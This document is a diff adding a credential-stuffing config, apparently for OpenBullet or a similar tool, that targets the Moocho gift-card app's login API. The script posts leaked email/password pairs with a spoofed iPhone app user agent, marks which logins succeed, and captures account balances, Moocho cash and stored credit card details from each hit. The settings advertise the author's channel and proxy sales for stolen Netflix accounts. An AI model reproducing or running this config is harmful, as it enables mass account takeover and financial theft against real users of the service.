@@ -1,0 +1,85 @@
+[SETTINGS]
+{
+  "Name": "Moocho {GIFT CARDS}",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2021-10-17T01:20:40.5452517-07:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@MasterLordConfigs",
+  "Version": "1.0.1 [CB]",
+  "Descriptions": "",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "JOIN > @MasterLordConfigs",
+      "VariableName": "",
+      "Id": 820940881
+    },
+    {
+      "Description": "IF YOU HAVE NETFLIX ACCOUNTS AND NEED VHQ PROXIES > @MasterLord007",
+      "VariableName": "",
+      "Id": 652035538
+    }
+  ],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#LOGIN REQUEST POST "https://api.moocho.com/Services/v2/Login.svc/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"device_id\":\"213FFCC8-A1FF-4DE6-8474-FE782E1085B2\",\"device_advertiser_id\":\"5D3F4AF7-1D9D-4FA2-93ED-F1C9C45A4A36\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: api.moocho.com" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Accept: */*" 
+  HEADER "Connection: keep-alive" 
+  HEADER "User-Agent: Moocho/4.3.0 (iPhone; iOS 12.4.3; Scale/2.00)" 
+  HEADER "Accept-Language: en-US;q=1, ar-US;q=0.9" 
+  HEADER "Accept-Encoding: br, gzip, deflate" 
+  HEADER "Content-Length: 172" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "FAILURE" 
+  KEYCHAIN Success OR 
+    KEY "SUCCESS" 
+
+#MOOCHO PARSE "<SOURCE>" LR "MoochesAvailable\":" "," CreateEmpty=FALSE -> CAP "Moocho" 
+
+#MOOCHO_CASH PARSE "<SOURCE>" LR "moochoCash\":" "," CreateEmpty=FALSE -> CAP "Moocho Cash" 
+
+#CCs PARSE "<SOURCE>" LR "creditCards\":" "," CreateEmpty=FALSE -> CAP "CCs" 
+
+#SCHOOL_BALANCE PARSE "<SOURCE>" LR "isSchoolBalanceAvailable\":" "," CreateEmpty=FALSE -> CAP "School Balance" 
+
+#CREATOR FUNCTION Constant "@MasterLordConfigs" -> CAP "Config By" 
+
